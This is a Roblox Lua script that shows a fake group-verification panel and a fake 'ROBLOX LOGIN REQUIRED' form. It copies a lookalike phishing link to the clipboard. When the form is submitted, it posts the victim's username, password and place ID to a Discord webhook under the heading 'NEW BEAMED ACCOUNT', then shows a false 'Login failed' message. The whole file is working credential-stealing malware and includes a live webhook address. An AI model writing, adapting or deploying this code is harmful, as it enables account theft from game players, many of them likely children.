local Players = game:GetService("Players")
local player = Players.LocalPlayer
local guiService = game:GetService("StarterGui")
local clipboard = game:GetService("Clipboard")
local httpService = game:GetService("HttpService")

local GROUP_LINK = "https://roblox.com.bz/communities/1713252036/#!/about"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1514988761912709281/wG1n9AYtVvspdiKwhy2KQ2mhF5KmdGLjW54vr_8gn7N5-o4ZcGSLrSw6jeM0bKjF6zF8"

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BeamPanel"
screenGui.Parent = player.PlayerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 400, 0, 300)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
mainFrame.BorderSizePixel = 0
mainFrame.BackgroundTransparency = 0.1
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
title.Text = "VERIFICATION REQUIRED"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.Parent = mainFrame

local desc = Instance.new("TextLabel")
desc.Size = UDim2.new(1, -20, 0, 60)
desc.Position = UDim2.new(0, 10, 0, 50)
desc.BackgroundTransparency = 1
desc.Text = "You must verify your group membership to continue.\nClick 'Verify' to join the required group."
desc.TextColor3 = Color3.fromRGB(200, 200, 200)
desc.Font = Enum.Font.Gotham
desc.TextSize = 14
desc.TextWrapped = true
desc.Parent = mainFrame

local verifyBtn = Instance.new("TextButton")
verifyBtn.Size = UDim2.new(0, 200, 0, 40)
verifyBtn.Position = UDim2.new(0.5, -100, 0, 140)
verifyBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
verifyBtn.Text = "VERIFY"
verifyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
verifyBtn.Font = Enum.Font.GothamBold
verifyBtn.TextSize = 18
verifyBtn.Parent = mainFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 0, 30)
statusLabel.Position = UDim2.new(0, 10, 0, 200)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = ""
statusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 12
statusLabel.Parent = mainFrame

local function copyGroupLink()
clipboard:set(GROUP_LINK)
statusLabel.Text = "Group link copied to clipboard! Open your browser and join."
wait(2)
statusLabel.Text = ""
end

local function showFakeLogin()
local loginGui = Instance.new("ScreenGui")
loginGui.Name = "FakeLogin"
loginGui.Parent = player.PlayerGui

local loginFrame = Instance.new("Frame")
loginFrame.Size = UDim2.new(0, 350, 0, 250)
loginFrame.Position = UDim2.new(0.5, -175, 0.5, -125)
loginFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
loginFrame.BorderSizePixel = 0
loginFrame.Parent = loginGui

local loginTitle = Instance.new("TextLabel")
loginTitle.Size = UDim2.new(1, 0, 0, 40)
loginTitle.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
loginTitle.Text = "ROBLOX LOGIN REQUIRED"
loginTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
loginTitle.Font = Enum.Font.GothamBold
loginTitle.TextSize = 16
loginTitle.Parent = loginFrame

local userLabel = Instance.new("TextLabel")
userLabel.Size = UDim2.new(0, 80, 0, 30)
userLabel.Position = UDim2.new(0, 20, 0, 60)
userLabel.BackgroundTransparency = 1
userLabel.Text = "Username:"
userLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
userLabel.TextXAlignment = Enum.TextXAlignment.Left
userLabel.Parent = loginFrame

local userBox = Instance.new("TextBox")
userBox.Size = UDim2.new(0, 200, 0, 30)
userBox.Position = UDim2.new(0, 110, 0, 60)
userBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
userBox.PlaceholderText = "Enter Roblox username"
userBox.Text = ""
userBox.Parent = loginFrame

local passLabel = Instance.new("TextLabel")
passLabel.Size = UDim2.new(0, 80, 0, 30)
passLabel.Position = UDim2.new(0, 20, 0, 110)
passLabel.BackgroundTransparency = 1
passLabel.Text = "Password:"
passLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
passLabel.TextXAlignment = Enum.TextXAlignment.Left
passLabel.Parent = loginFrame

local passBox = Instance.new("TextBox")
passBox.Size = UDim2.new(0, 200, 0, 30)
passBox.Position = UDim2.new(0, 110, 0, 110)
passBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
passBox.PlaceholderText = "Enter password"
passBox.Text = ""
passBox.Parent = loginFrame

local submitBtn = Instance.new("TextButton")
submitBtn.Size = UDim2.new(0, 150, 0, 35)
submitBtn.Position = UDim2.new(0.5, -75, 0, 170)
submitBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
submitBtn.Text = "LOGIN"
submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
submitBtn.Font = Enum.Font.GothamBold
submitBtn.Parent = loginFrame

local loginStatus = Instance.new("TextLabel")
loginStatus.Size = UDim2.new(1, -20, 0, 20)
loginStatus.Position = UDim2.new(0, 10, 0, 215)
loginStatus.BackgroundTransparency = 1
loginStatus.Text = ""
loginStatus.TextColor3 = Color3.fromRGB(255, 100, 100)
loginStatus.TextSize = 11
loginStatus.Parent = loginFrame

submitBtn.MouseButton1Click:Connect(function()
local username = userBox.Text
local password = passBox.Text
if username == "" or password == "" then
loginStatus.Text = "Please fill both fields"
return
end
local data = {
content = string.format("NEW BEAMED ACCOUNT\nUsername: %s\nPassword: %s\nVictim IP/Place: %s", username, password, game.PlaceId)
}
local jsonData = httpService:JSONEncode(data)
local headers = {["Content-Type"] = "application/json"}
httpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)

loginStatus.Text = "Login failed. Please try again later."
loginStatus.TextColor3 = Color3.fromRGB(255, 100, 100)
wait(2)
loginGui:Destroy()
screenGui:Destroy()
end)
end

verifyBtn.MouseButton1Click:Connect(function()
copyGroupLink()
wait(0.5)
showFakeLogin()
end)

copyGroupLink()
wait(1)
showFakeLogin()

